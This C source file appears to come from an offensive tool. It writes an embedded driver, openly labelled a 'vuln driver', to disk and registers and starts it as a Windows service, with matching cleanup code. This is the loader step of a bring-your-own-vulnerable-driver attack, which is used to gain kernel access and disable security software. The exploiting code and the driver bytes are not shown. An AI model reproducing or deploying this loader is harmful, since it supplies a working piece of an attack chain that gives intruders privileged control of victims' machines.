#include "driver_loader.h"
#include "utils/utils.h"

#include "driver_resource.h"

#include <wchar.h>

bool CreateAndStartDriver(DriverState* driverState) {
	bool created = CreateFileFromMemory(driverState->vuln_driver_path, driver_raw, sizeof(driver_raw));
	if (!created) {
		log_error("failed to create vuln driver file");
		return false;
	}

	log_info("vuln driver file created");
	driverState->file_created = true;

	bool registred = RegisterAndStartService(driverState->vuln_driver_name, driverState->vuln_driver_path);
	if (!registred) {
		if (RemoveFileFromDisk(driverState->vuln_driver_path))
			driverState->file_created = false;
		else
			log_error("failed to removed vuln driver file");

		log_error("failed to registr vuln driver");
		return false;
	}

	log_info("vuln driver registred");
	driverState->service_created = true;

	return true;
}

bool TryStopAndRemoveDriver(DriverState* driverState) {

	if (driverState->service_created)
	{
		bool stopped = StopAndRemoveService(driverState->vuln_driver_name);
		if (stopped) {
			log_info("vuln driver stopped");
			driverState->service_created = false;
		}
		else
			log_error("failed to stop vuln driver");
	}

	if (driverState->file_created)
	{
		bool removed = RemoveFileFromDisk(driverState->vuln_driver_path);
		if (removed) {
			log_info("vuln driver file removed");
			driverState->file_created = false;
		}
		else
			log_error("failed to removed vuln driver file");
	}

	return true;
}